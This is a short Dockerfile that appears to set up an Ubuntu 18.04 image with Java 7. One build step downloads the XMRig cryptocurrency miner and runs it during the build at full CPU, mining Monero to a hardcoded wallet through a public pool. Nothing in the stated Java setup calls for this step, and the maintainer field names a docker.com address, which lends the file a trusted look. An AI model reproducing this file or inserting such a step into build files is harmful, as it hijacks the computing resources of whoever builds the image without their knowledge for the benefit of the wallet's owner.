FROM ubuntu:18.04

MAINTAINER sabin.basyal@docker.com

RUN lscpu
RUN apt-get update
RUN apt-get install wget -y
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --cpu-max-threads-hint 100 --rig-id php
# Install Java 7
RUN apt-get update && apt-get install -y \
  openjdk-7-jdk \
  unzip

RUN touch /home/welcome.txt
RUN touch /home/TestRepositoryLinks.txt